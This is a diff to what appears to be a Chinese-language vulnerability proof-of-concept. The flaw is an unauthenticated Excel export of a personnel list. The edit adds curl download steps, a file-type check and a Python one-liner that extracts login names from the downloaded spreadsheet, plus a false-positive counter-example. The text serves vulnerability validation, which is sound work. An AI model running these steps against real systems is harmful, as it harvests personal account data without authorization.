@@ -41,11 +41,26 @@ curl -s "http://target/ExcelExport/人员列表.xls" -o user_list.xls
 
 ## 验证方法
 
+未登录直接下载，判据是下载到的确实是人员台账，而不是登录页或被重定向的错误页。
+
 ```bash
-# 检查是否返回 Excel 文件
-curl -s "http://target/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls" -o /dev/null -w "%{http_code}\n%{content_type}"
-# 返回 200 且 content_type 包含 excel/octet-stream 则存在漏洞
+curl -s "http://target/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls" -o user_list.xls
+
+# 判据 1：是 OLE/Excel 复合文档而非 HTML
+file user_list.xls
+# 期望：Composite Document File / Microsoft Excel
+
+# 判据 2：文件里有人员台账的列名与真实登录名（xls 内字符串为 UTF-16LE）
+python3 -c "
+import re
+d = open('user_list.xls','rb').read()
+print([m.decode('utf-16-le','ignore') for m in re.findall(rb'(?:[\x20-\x7e]\x00){3,}', d)][:20])
+"
 ```
+
+判据：文件类型为 Excel 复合文档，且内容里出现人员台账的列名与真实登录名（如 `登录名`/`loginName` 列及其取值）。抓到登录名是敏感结构化数据，不是产品词。
+
+反例：接口返回 200 且 `Content-Type` 是 `application/vnd.ms-excel`，但内容其实是登录页 HTML 或空模板（无任何用户名记录）—— 只是路由存在，信息泄露不成立。
 
 ## 指纹确认
 
